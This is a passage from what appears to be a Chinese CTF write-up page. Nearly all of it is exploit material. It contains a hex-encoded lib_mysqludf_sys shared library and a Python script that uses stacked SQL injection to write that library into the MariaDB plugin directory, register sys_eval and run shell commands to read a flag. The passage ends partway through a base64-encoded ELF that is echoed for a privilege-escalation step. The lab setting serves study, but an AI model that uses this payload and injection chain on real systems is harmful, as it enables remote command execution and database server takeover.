CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">21510</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    end </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">append</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">udf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">end</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">dict</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">zip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">text</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> t </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> text</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> base_url</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&quot;?id=&#x27;;select unhex(&#x27;{}&#x27;) into dumpfile &#x27;/usr/lib/mariadb/plugin/{}.txt&#x27;--+&amp;page=1&amp;limit=10&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">t</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> t</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">status_code</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">next_url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> base_url</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&quot;?id=&#x27;;select concat(load_file(&#x27;/usr/lib/mariadb/plugin/a.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/b.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/c.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/d.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/e.txt&#x27;)) into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so&#x27;--+&amp;page=1&amp;limit=10&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rn </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">next_url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">uaf_url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">base_url</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&quot;?id=&#x27;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;--+&quot;</span><span class="token comment" style="color:#999988;font-style:italic">#导入udf函数</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">uaf_url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nn_url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> base_url</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&quot;?id=&#x27;;select sys_eval(&#x27;cat /flag.*&#x27;);--+&amp;page=1&amp;limit=10&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rnn </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">nn_url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rnn</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>那就顺带提一下终极考核第一台提权</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;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